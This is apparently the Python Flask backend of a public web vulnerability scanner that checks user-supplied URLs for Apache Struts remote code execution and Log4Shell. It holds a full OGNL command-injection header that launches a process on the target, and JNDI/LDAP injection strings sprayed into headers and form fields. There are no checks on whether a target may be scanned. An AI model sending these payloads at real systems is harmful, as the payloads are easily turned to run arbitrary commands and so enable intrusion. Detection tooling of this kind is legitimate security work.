import datetime
from bs4 import BeautifulSoup
import requests
import random
from dotenv import load_dotenv
from os import stat
import os
from flask import Flask, render_template, request, redirect, url_for, flash, jsonify, send_from_directory
from flask_cors import CORS
from flask_restful import Api, Resource, reqparse
import sqlite3
from urllib import parse
from http.client import IncompleteRead
import urllib
from requests.utils import requote_uri
import socket
import threading
import time
import sys, traceback
load_dotenv()

os.environ['NO_PROXY'] = '127.0.0.1'
port = int(os.getenv("PORT"))
self_ip = os.getenv("IP_ADDRESS")
admin_username = os.getenv("ADMIN")
admin_password = os.getenv("PASSWORD")

app = Flask(__name__, static_url_path='', static_folder='frontend/build')
# CORS(app)
api = Api(app)
class ScannerAPI(Resource):
    def get(self):
        parser = reqparse.RequestParser()
        parser.add_argument('url', type=str, required=True, help="URL cannot be blank!")
        parser.add_argument('type', type=str, required=True, help="Scan type cannot be blank!")
        args = parser.parse_args()
        url = args['url']
        scan_type = args['type']
        status = dict()
        status['status'] = 'An error occurred. Please try again.'
        status['url'] = url
        if scan_type == "struts":
            status = self.scan_struts(url)
        elif scan_type == "log4shell":
            status = self.scan_log4shell(url)
        insert_log(request.remote_addr, url, status.get('status'))
        return status
    
    def post(self):
        return {'error': 'Forbidden'}, 403

    def scan_struts(self, url):
        status = dict()
        try:
            num_1 = random.randint(10000, 99999)
            num_2 = random.randint(10000, 99999)
            result = num_1 + num_2
            headers = dict()
            sum_str = str(num_1) + ' + ' + str(num_2)
            headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'
            headers['Content-Type'] = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwor k2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd_win='set /a sum=" + str(sum_str) + "').(#cmd_lin='expr " + str(sum_str) + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd_win}:{'/bin/bash','-c',#cmd_lin})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
            res = requests.get(url=url)
            if res.status_code == 200 or res.status_code == 302:
                url_temp = parse.urlparse(url=url)
                url_two = url_temp.scheme + '://' + url_temp.netloc + url_temp.path
                if url_temp.query:
                    url_two = url_temp + '?' + url_temp.query
                url_two = str(requote_uri(url_two))
                request = urllib.request.Request(url=url_two, headers=headers)
                page = urllib.request.urlopen(request).read().decode('utf-8')
                if str(result) in page:
                    status['status'] = 'Vulnerable to Apache Struts RCE'
                    status['url'] = url
                else:
                    status['status'] = 'Not Vulnerable to Apache Struts RCE'
                    status['url'] = url
            else:
                status['status'] = 'Error reaching URL'
                status['url'] = url
        except IncompleteRead as e:
            page = str(int(e.partial))
            if str(result) in page:
                status['status'] = 'Vulnerable to Apache Struts RCE'
                status['url'] = url
        except Exception as e:
            status['status'] = 'Error reaching URL'
            status['url'] = url
            pass
        return status

    def scan_log4shell(self, url):
        status = dict()
        status['status'] = 'Error reaching URL'
        status['url'] = url
        HOST = "127.0.0.1"
        PORT = 1389
        method, data, action = get_details(url)
        print(f"Starting server on 0.0.0.0:{PORT}")
        status['status'] = 'Probably not vulnerable to Log4Shell'
        status['url'] = url
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind((HOST, PORT))
            except Exception as e:
                print(e)
                status['status'] = 'Port busy. Try again in a few seconds'
                status['url'] = url
                pass
            try:
                s.listen()
                req_thread = threading.Thread(target=send_request_1, args=(url, status, ), daemon=True)
                req_thread.start()
                req_thread_2 = threading.Thread(target=send_request_2, args=(url, method, data, action, s, status, ), daemon=True)
                req_thread_2.start()
                time.sleep(2)
                conn, addr = s.accept()
                with conn:
                    print(f"Connected by {addr}. Most likely vulnerable")
                    while True:
                        data = conn.recv(1024)
                        if not data: break
                        status['status'] = 'Likely vulnerable to Log4Shell'
                        status['url'] = url
                        break
                s.close()
            except Exception as e:
                pass
        return status

def insert_log(ip, url, result):
    conn = sqlite3.connect('database.db', detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, url TEXT, result TEXT, datetime TIMESTAMP)")
    conn.commit()
    current_datetime = datetime.datetime.now()
    cur.execute("INSERT INTO logs (ip, url, result, datetime) VALUES (?, ?, ?, ?)", (ip, url, str(result), current_datetime))
    conn.commit()

def insert_feedback(ip, email, feedback):
    conn = sqlite3.connect('database.db', detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS feedback (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, email TEXT, feedback TEXT, datetime TIMESTAMP)")
    conn.commit()
    current_datetime = datetime.datetime.now()
    cur.execute("INSERT INTO feedback (ip, email, feedback, datetime) VALUES (?, ?, ?, ?)", (ip, email, feedback, current_datetime))
    conn.commit()

def get_details(url):
    try:
        req = requests.get(url, verify=False)
        req_parsed = BeautifulSoup(req.text, 'html.parser')
        forms = req_parsed.findAll('form')
        method = []
        data = []
        action = []
        for form in forms:
            method.append(form.get('method'))
            action.append(form.get('action'))
            inputs = form.findAll('input')
            form_data = ''
            for input in inputs:
                if input.get('type') != 'submit' or input.get('type') != 'button' or input.get('type') != 'image' or input.get('type') != 'reset' or input.get('type') != 'file' or input.get('type') != 'hidden' or input.get('type') != 'radio' or input.get('type') != 'checkbox':
                    form_data += input.get('name') + '=${jndi:ldap://' + self_ip + ':1389/a}&'
                elif input.get('type') == 'submit' or input.get('type') == 'button' or input.get('type') == 'image' or input.get('type') == 'reset' or input.get('type') == 'file' or input.get('type') == 'hidden' or input.get('type') == 'radio' or input.get('type') == 'checkbox':
                    form_data += input.get('name') + '=' + input.get('value') + '&'
            data.append(form_data)
    except Exception as e:
        print(e)
        method = ['get']
        data = ['']
        action = [url]
    return method, data, action

def send_request_1(url, status):
    try:
        requests.get(
            url,
            headers={
                'X-Api-Version': '${jndi:ldap://' + self_ip + ':1389/a}',
                'User-Agent': '${jndi:ldap://' + self_ip + ':1389/a}',
            },
            verify=False
        )
    except requests.exceptions.ConnectionError as e:
        # print(f"HTTP connection to target URL error: {e}")
        status['status'] = 'Error reaching URL'
        status['url'] = url
        pass

    # print(f"Waiting 10 seconds for a response")
    time.sleep(10)

def send_request_2(url, methods, datas, actions, s, status):
    try:
        for i in range(len(methods)):
            url_temp = parse.urlparse(url=url)
            method = methods[i]
            data = datas[i][:-1]
            action = actions[i]
            time.sleep(0.5)
            if method.lower() == 'get':
                requests.get(
                    url + '?' + data,
                    headers={
                        'X-Api-Version': '${jndi:ldap://' + self_ip + ':1389/a}',
                        'User-Agent': '${jndi:ldap://' + self_ip + ':1389/a}'
                    },
                    verify=False
                )
            elif method.lower() == 'post' and action != None and data != None and (action == url_temp.path or action == url):
                requests.post(
                    url,
                    data=data,
                    headers={
                        'X-Api-Version': '${jndi:ldap://' + self_ip + ':1389/a}',
                        'User-Agent': '${jndi:ldap://' + self_ip + ':1389/a}'
                    },
                    verify=False
                )
            else:
                req = requests.post(
                    url + action,
                    data=data,
                    headers={
                        'X-Api-Version': '${jndi:ldap://' + self_ip + ':1389/a}',
                        'User-Agent': '${jndi:ldap://' + self_ip + ':1389/a}',
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    verify=False
                )
    except requests.exceptions.ConnectionError as e:
        # print(f"HTTP connection to target URL error: {e}")
        status['status'] = 'Error reaching URL'
        status['url'] = url
        pass
    except Exception as e:
        # print(traceback.format_exc())
        status['status'] = 'Error reaching URL'
        status['url'] = url
        pass
    # print(f"Waiting 10 seconds for a response")
    time.sleep(10)
    s.close()

@app.route('/logs', methods=['POST'])
def logs():
    username = request.json['username']
    password = request.json['password']
    if username == admin_username and password == admin_password:
        conn = sqlite3.connect('database.db', detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)
        cur = conn.cursor()
        cur.execute("SELECT * FROM logs")
        logs = cur.fetchall()
        conn = sqlite3.connect('database.db', detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)
        cur = conn.cursor()
        cur.execute("SELECT * FROM feedback")
        feedbacks = cur.fetchall()
        return jsonify(logs=logs, feedbacks=feedbacks)
        # return render_template('logs_backup.html', logs=logs, feedbacks=feedbacks)
    else:
        return { 'status': 'Incorrect Credentials' }
        # return app.send_static_file('index.html')

@app.route('/feedback', methods=['POST'])
def feedback():
    parser = reqparse.RequestParser()
    parser.add_argument('email', type=str, required=True, help="Email cannot be blank!")
    parser.add_argument('feedback', type=str, required=True, help="Feedback cannot be blank!")
    args = parser.parse_args()
    feedback = args['feedback']
    email = args['email']
    if feedback:
        insert_feedback(request.remote_addr, feedback, email)
        return {'status': 'success'}
    else:
        return {'status': 'failed'}

@app.route('/', methods=['GET', 'POST'], defaults={'path': ''})
def serve(path):
    return send_from_directory(app.static_folder, 'index.html')

@app.errorhandler(404)
def not_found(e):
    return app.send_static_file('index.html')
   
api.add_resource(ScannerAPI, '/scan', endpoint='scan')

if __name__ == '__main__':
    app.run(debug=True, port=port)